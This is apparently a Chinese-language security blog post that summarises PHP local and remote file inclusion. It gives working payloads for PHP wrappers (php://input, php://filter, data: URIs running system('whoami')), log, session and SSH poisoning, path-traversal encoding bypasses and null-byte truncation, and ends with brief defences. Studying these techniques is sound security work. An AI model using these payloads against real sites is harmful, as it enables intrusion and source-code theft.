---
layout: post
title: "File Include"
description: "A Summary of File Inclusion."
categories: [fileInclude]
tags: [summary,web]
redirect_from:
  - /2019/02/10/
---

* Kramdown table of contents
{:toc .toc}

# 本地文件包含的利用思路

1. 通过日志写入任意代码进行包含攻击
2. 利用上传点，上传正常文件包含webshell脚本
3. LFI With PHPInfo Assistance
4. 包含session(默认php安装配置，获取sesion文件名)

# php文件包含

php的文件包含函数：

1. include()
2. include_once()
3. require()
4. require_once()

> reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。
^
> include() 如果出错的话，只会提出警告，会继续执行后续语句。

当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。

可能存在文件包含漏洞的必要条件：

1. 具有文件包含函数。
2. 文件包含函数中存在动态变量。

~~~php
include $file;
~~~


3. 攻击者能够控制该变量。

~~~php
$file = $_GET['file'];
~~~

# 分类

### LFI(Local File Inclusion)

本地文件包含漏洞，是指能打开并包含本地文件的漏洞。

### RFI(Remote File Inclusion)

远程文件包含漏洞。是指能够远程包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害和很大。

但RFI的利用条件较为苛刻，需要php.ini中进行配置：

> allow_url_fopen = On
> allow_url_include = On

两个配置选项均需要为On，才能远程包含文件成功。

> 在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认Off。

# 利用方法

## php伪协议

### php://input

利用条件：

1. allow_url_include = On。
2. 对allow_url_fopen不做要求。

利用方法：

~~~
index.php
?file=php://input

POST:
<?php phpinfo();?>
~~~

### php://filter

利用条件：

无

利用方法：

~~~
index.php?
file=php://filter/read=convert.base64-encode/resource=index.php
~~~
^
~~~
index.php?
file=php://filter/convert.base64-encode/resource=index.php
~~~

> 可以直接读取经过base64加密后的文件源码。

### phar://

利用条件：

php版本大于等于5.3.0

利用方法：

将php文件打包成zip压缩包，然后

指定绝对路径：

~~~
index.php?file+phar://D:/phpStudy/WWW/test.zip/test.php
~~~

或者相对路径：

~~~
index.php?file=phar://test.zip/test.php
~~~

### zip://

利用条件：

php版本大于等于5.3.0

利用方法：

构造zip包

然后指定绝对路径，同时将`#`编码为`%23`，之后填上压缩包内的文件。

~~~
index.php?file=zip://D:\phpStudy\WWW\test.zip%23test.php
~~~

> 使用相对路径会包含失败。

### data:URI schema

利用条件：

1. php版本大于等于php5.2.0
2. allow_url_fopen = On
3. allow_url_include = On

利用方法：

~~~
index.php?file=data:text/plain,<?php system('whoami');?>
~~~
^
~~~
index.php?file=data:text;base64,PD9waHAgcGhwaW5mbygpOz8%2b
~~~



加号+的url编码为`%2b`，`PD9waHAgcGhwaW5mbygpOz8%2b`的base64解码为：`<?php phpinfo();?>`。

### 包含session

利用条件：

1. session文件路径已知
2. session文件内容可控

> php的session文件的保存路径可以在phpinfo的session.save_path看到。

常见的php-session存放位置：

1. /var/lib/php/sess_PHPSESSID
2. /var/lib/php/sess_PHPSESSID
3. /tmp/sess_PHPSESSID
4. /tmp/sessions/sess_PHPSESSID

session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。

### 包含日志

#### 访问日志

利用条件：

1. 服务器日志文件路径已知
2. 服务器日志文件可读

利用方式：

使用burp截包后修改。

> 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。

#### ssh日志

利用条件：

1. ssh日志位置已知
2. ssh日志可读

> 日志位置默认情况下为 /var/log/auth.log

利用方式：

~~~
ubuntu@VM-207-93-ubuntu:~$ ssh '<?php phpinfo(); ?>'@remotehost
~~~

#### 包含environ

利用条件：

1. php以cgi方式运行，这样environ才会保存UA头。
2. environ文件存储位置已知，且environ文件可读。

利用方式：

proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。

#### 包含上传文件

利用条件：

1. 文件上传路径
2. 文件名

利用方式：

文件上传

# 绕过姿势

## 指定前缀

服务器代码：

~~~php
<?php
	$file = $_GET['file'];
	include '/var/www/html/'.$file;
?>
~~~

利用../或..\

编码绕过：

* 利用URL编码
  * ../
     + %2e%2e%2f
  * ..\
     + %2e%2e%5c
* 二次编码
  * ../
     + %252e%252e%252f
  * ..\
     + %252e%252e%255c
* 容器或服务器的编码方式
  * ../
     + %252e%252e%255c
         * [Why does Directory traversal attack %C0%AF work?](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
     + %c0%ae%c0%ae/
         * java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）
         * Apache Tomcat Directory Traversal
  * ..\
     + ..%c1%9c

## 指定后缀

服务器代码：

~~~php
<?php
	$file = $_GET['file'];
	include $file.'/test/test.php';
?>
~~~

### 利用URL特殊符号

#### query(?)

~~~
index.php?file=http://remoteaddr/remoteinfo.txt?
~~~

则包含的文件为 `http://remoteaddr/remoteinfo.txt?/test/test.php`

#### fragment(#)

~~~
index.php?file=http://remoteaddr/remoteinfo.txt%23
~~~

则包含的文件为 `http://remoteaddr/remoteinfo.txt#/test/test.php`

> 注意需要把#进行url编码为%23。

### 利用协议

利用zip协议，注意要指定绝对路径

~~~
index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta
~~~

则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php

### 长度截断

利用条件：
 
php版本小于5.2.8

目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复`./`，则后缀`/test/test.php`，在达到最大值后会被直接丢弃掉。

### 0字节截断

利用条件： 
php版本小于5.3.4

~~~
index.php?file=phpinfo.txt%00
~~~

# 防御方案

1. 在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败
2. 做好文件的权限管理
3. 对危险字符进行过滤等等
